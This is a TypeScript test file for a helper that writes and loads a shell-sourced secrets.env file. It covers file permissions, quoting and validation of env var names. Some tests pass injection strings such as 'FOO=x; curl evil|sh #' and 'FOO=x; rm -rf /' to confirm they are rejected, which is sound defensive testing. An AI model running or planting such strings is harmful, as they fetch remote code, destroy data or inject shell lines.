// Tests for the shared ~/.gini/secrets.env writer.
//
// The interesting branches are:
//   - new-file: directory doesn't exist, write creates it with mode 0600.
//   - existing-file at 0644: chmod-on-existing-file forces it back to 0600.
//   - quoting of values containing single quotes (POSIX shell ANSI-C
//     quoting via `'\''`).
//   - idempotent re-write replaces the existing line, doesn't duplicate.

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import {
  isSafeEnvVarName,
  isValidEnvVarName,
  loadSecretsEnvIntoProcess,
  removeKeyFromSecretsEnv,
  secretsEnvHasKey,
  secretsEnvPath,
  unquoteSecretsValue,
  writeKeyToSecretsEnv
} from "./secrets-env";

function tag(): string {
  return `${process.pid}-${Math.floor(Math.random() * 1_000_000)}`;
}

describe("env var name guard", () => {
  // Point HOME at a scratch dir so that even if the guard ever regressed, a
  // write could not touch the developer's real ~/.gini/secrets.env.
  let scratchHome: string;
  let prevHome: string | undefined;
  beforeEach(() => {
    scratchHome = `/tmp/gini-secrets-env-guard/${tag()}`;
    rmSync(scratchHome, { recursive: true, force: true });
    mkdirSync(scratchHome, { recursive: true });
    prevHome = process.env.HOME;
    process.env.HOME = scratchHome;
  });
  afterEach(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(scratchHome, { recursive: true, force: true });
  });

  test("accepts plain identifiers, rejects shell/regex-injection names", () => {
    expect(isSafeEnvVarName("ANTHROPIC_API_KEY")).toBe(true);
    expect(isSafeEnvVarName("_X1")).toBe(true);
    expect(isSafeEnvVarName("FOO=x; curl evil|sh #")).toBe(false);
    expect(isSafeEnvVarName("BAD NAME")).toBe(false);
    expect(isSafeEnvVarName("LINE\nINJECT")).toBe(false);
    expect(isSafeEnvVarName("1LEADING")).toBe(false);
    expect(isSafeEnvVarName("")).toBe(false);
  });

  test("write throws on an unsafe name (never reaches the shell-sourced file); remove/has no-op", () => {
    expect(() => writeKeyToSecretsEnv("FOO=x; rm -rf /", "v")).toThrow(/unsafe env var name/);
    expect(removeKeyFromSecretsEnv("BAD NAME")).toBe(false);
    expect(secretsEnvHasKey("BAD NAME")).toBe(false);
  });
});

describe("writeKeyToSecretsEnv", () => {
  let scratchHome: string;
  let prevHome: string | undefined;

  beforeEach(() => {
    scratchHome = `/tmp/gini-secrets-env-tests/${tag()}`;
    rmSync(scratchHome, { recursive: true, force: true });
    mkdirSync(scratchHome, { recursive: true });
    prevHome = process.env.HOME;
    process.env.HOME = scratchHome;
  });

  afterEach(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(scratchHome, { recursive: true, force: true });
  });

  test("creates ~/.gini/secrets.env at mode 0600 when neither dir nor file exist", () => {
    writeKeyToSecretsEnv("OPENAI_API_KEY", "sk-test-12345");
    const path = secretsEnvPath();
    expect(existsSync(path)).toBe(true);
    expect(readFileSync(path, "utf8")).toBe("export OPENAI_API_KEY='sk-test-12345'\n");
    // 0o777 mask to ignore platform high bits.
    expect(statSync(path).mode & 0o777).toBe(0o600);
  });

  test("forces mode 0600 even when the file pre-existed at 0644", () => {
    const path = secretsEnvPath();
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(path, "OTHER_KEY=value\n");
    chmodSync(path, 0o644);
    expect(statSync(path).mode & 0o777).toBe(0o644);

    writeKeyToSecretsEnv("OPENAI_API_KEY", "sk-fix-perm");

    expect(statSync(path).mode & 0o777).toBe(0o600);
    const body = readFileSync(path, "utf8");
    expect(body).toContain("OTHER_KEY=value");
    expect(body).toContain("export OPENAI_API_KEY='sk-fix-perm'");
  });

  test("escapes single quotes in the value via POSIX ANSI-C quoting", () => {
    writeKeyToSecretsEnv("TRICKY", "val'with'quotes");
    const body = readFileSync(secretsEnvPath(), "utf8");
    // shellSingleQuote produces `'val'\''with'\''quotes'` — closes the
    // single-quoted region, inserts an escaped quote, reopens.
    expect(body).toContain(`export TRICKY='val'\\''with'\\''quotes'\n`);
  });

  test("replaces an existing line in place (idempotent re-write)", () => {
    writeKeyToSecretsEnv("OPENAI_API_KEY", "sk-first");
    writeKeyToSecretsEnv("OPENAI_API_KEY", "sk-second");
    const body = readFileSync(secretsEnvPath(), "utf8");
    expect(body).toBe("export OPENAI_API_KEY='sk-second'\n");
    // No duplicate line.
    const matches = body.match(/OPENAI_API_KEY/g) ?? [];
    expect(matches.length).toBe(1);
  });

  test("matches both `export NAME=` and bare `NAME=` forms when replacing", () => {
    const path = secretsEnvPath();
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(path, "OPENAI_API_KEY=sk-bare-form\n");

    writeKeyToSecretsEnv("OPENAI_API_KEY", "sk-replaced");

    const body = readFileSync(path, "utf8");
    expect(body).toBe("export OPENAI_API_KEY='sk-replaced'\n");
  });

  test("appends a newline when the existing file doesn't end with one", () => {
    const path = secretsEnvPath();
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(path, "FIRST_KEY=value");

    writeKeyToSecretsEnv("OPENAI_API_KEY", "sk-second");

    const body = readFileSync(path, "utf8");
    expect(body).toBe("FIRST_KEY=value\nexport OPENAI_API_KEY='sk-second'\n");
  });
});

describe("secretsEnvHasKey", () => {
  let scratchHome: string;
  let savedHome: string | undefined;

  beforeEach(() => {
    savedHome = process.env.HOME;
    scratchHome = join("/tmp", `gini-secrets-env-haskey-${tag()}`);
    rmSync(scratchHome, { recursive: true, force: true });
    mkdirSync(scratchHome, { recursive: true });
    process.env.HOME = scratchHome;
  });

  afterEach(() => {
    if (savedHome === undefined) delete process.env.HOME;
    else process.env.HOME = savedHome;
    rmSync(scratchHome, { recursive: true, force: true });
  });

  test("returns false when the file doesn't exist", () => {
    expect(secretsEnvHasKey("OPENAI_API_KEY")).toBe(false);
  });

  test("returns true when the key has a non-empty value", () => {
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(secretsEnvPath(), `export OPENAI_API_KEY='sk-real-key'\n`);
    expect(secretsEnvHasKey("OPENAI_API_KEY")).toBe(true);
  });

  test("returns FALSE for an empty value — placeholder is treated as missing", () => {
    // The openclaw migrator's skip-existing check used to fire for
    // empty placeholders, which meant `gini setup` writing
    // `OPENAI_API_KEY=""` would block a later openclaw migration
    // from overwriting it with the real key. Aligning the
    // semantics with `hasKeyInSecretsFile` in setup.ts (which
    // already treats empty as missing) closes that gap.
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(secretsEnvPath(), `OPENAI_API_KEY=""\n`);
    expect(secretsEnvHasKey("OPENAI_API_KEY")).toBe(false);
  });

  test("returns false for a single-quoted empty value", () => {
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(secretsEnvPath(), `export OPENAI_API_KEY=''\n`);
    expect(secretsEnvHasKey("OPENAI_API_KEY")).toBe(false);
  });

  test("returns false for whitespace-only value", () => {
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(secretsEnvPath(), `OPENAI_API_KEY=   \n`);
    expect(secretsEnvHasKey("OPENAI_API_KEY")).toBe(false);
  });

  test("returns true for a bare (unquoted) non-empty value", () => {
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    writeFileSync(secretsEnvPath(), `OPENAI_API_KEY=sk-bare\n`);
    expect(secretsEnvHasKey("OPENAI_API_KEY")).toBe(true);
  });
});

describe("unquoteSecretsValue", () => {
  test("returns empty string for empty input", () => {
    expect(unquoteSecretsValue("")).toBe("");
  });

  test("strips single-quoted wrapping and decodes POSIX `'\\''` escapes", () => {
    expect(unquoteSecretsValue("'sk-it'\\''s-here'")).toBe("sk-it's-here");
  });

  test("strips double-quoted wrapping and decodes escaped quotes / dollars", () => {
    expect(unquoteSecretsValue(`"sk-\\"quoted\\""`)).toBe(`sk-"quoted"`);
  });

  test("passes through unquoted values verbatim (trimmed)", () => {
    expect(unquoteSecretsValue("  sk-bare  ")).toBe("sk-bare");
  });
});

describe("env-var name validation", () => {
  test("isValidEnvVarName accepts POSIX identifiers and rejects the rest", () => {
    expect(isValidEnvVarName("OPENAI_API_KEY")).toBe(true);
    expect(isValidEnvVarName("AZURE_OPENAI_API_KEY")).toBe(true);
    expect(isValidEnvVarName("_x9")).toBe(true);
    expect(isValidEnvVarName("9LEADING")).toBe(false);
    expect(isValidEnvVarName("HAS SPACE")).toBe(false);
    expect(isValidEnvVarName("FOO=bar")).toBe(false);
    expect(isValidEnvVarName("FOO\nexport EVIL")).toBe(false);
    expect(isValidEnvVarName("")).toBe(false);
  });

  test("the writer rejects, and the remover no-ops on, a malformed name instead of injecting it", () => {
    // A name carrying `=` or a newline would otherwise inject an extra line into
    // the shell-sourced secrets.env. The guard runs before any filesystem access,
    // so no sandbox is needed. The writer throws; the remover treats an
    // unwritable name as nothing-to-remove (false) without touching the file.
    expect(() => writeKeyToSecretsEnv("FOO=evil\nexport BAR", "v")).toThrow(/unsafe env var name/);
    expect(removeKeyFromSecretsEnv("FOO=evil\nexport BAR")).toBe(false);
  });
});

describe("loadSecretsEnvIntoProcess", () => {
  // Names chosen to be inert (never real provider vars) so mutating them
  // can't perturb another test's provider state; restored fully after each.
  const KEYS = ["GINI_TEST_LOAD_A", "GINI_TEST_LOAD_B", "GINI_TEST_LOAD_EMPTY"];
  let scratchHome: string;
  let savedHome: string | undefined;
  let savedKeys: Record<string, string | undefined>;

  beforeEach(() => {
    savedHome = process.env.HOME;
    savedKeys = {};
    for (const key of KEYS) {
      savedKeys[key] = process.env[key];
      delete process.env[key];
    }
    scratchHome = join("/tmp", `gini-secrets-env-load-${tag()}`);
    rmSync(scratchHome, { recursive: true, force: true });
    mkdirSync(join(scratchHome, ".gini"), { recursive: true });
    process.env.HOME = scratchHome;
  });

  afterEach(() => {
    if (savedHome === undefined) delete process.env.HOME;
    else process.env.HOME = savedHome;
    for (const key of KEYS) {
      const prev = savedKeys[key];
      if (prev === undefined) delete process.env[key];
      else process.env[key] = prev;
    }
    rmSync(scratchHome, { recursive: true, force: true });
  });

  test("sets missing keys, unquoting values, and returns the keys it set", () => {
    writeFileSync(
      secretsEnvPath(),
      `export GINI_TEST_LOAD_A='val'\\''with'\\''quotes'\nGINI_TEST_LOAD_B=bare-value\n`
    );
    const set = loadSecretsEnvIntoProcess();
    expect(process.env.GINI_TEST_LOAD_A).toBe("val'with'quotes");
    expect(process.env.GINI_TEST_LOAD_B).toBe("bare-value");
    expect(set.sort()).toEqual(["GINI_TEST_LOAD_A", "GINI_TEST_LOAD_B"]);
  });

  test("fill-missing: a pre-set non-empty value is NOT overwritten; an empty one IS filled", () => {
    process.env.GINI_TEST_LOAD_A = "ambient-wins";
    process.env.GINI_TEST_LOAD_EMPTY = "";
    writeFileSync(
      secretsEnvPath(),
      `GINI_TEST_LOAD_A=from-file\nGINI_TEST_LOAD_EMPTY=filled\n`
    );
    const set = loadSecretsEnvIntoProcess();
    // Ambient non-empty value survives; the empty one gets filled from the file.
    expect(process.env.GINI_TEST_LOAD_A).toBe("ambient-wins");
    expect(process.env.GINI_TEST_LOAD_EMPTY).toBe("filled");
    expect(set).toEqual(["GINI_TEST_LOAD_EMPTY"]);
  });

  test("no-op returning [] when the file is absent, without throwing", () => {
    // Fresh scratch HOME has ~/.gini but no secrets.env.
    expect(loadSecretsEnvIntoProcess()).toEqual([]);
    for (const key of KEYS) expect(process.env[key]).toBeUndefined();
  });
});
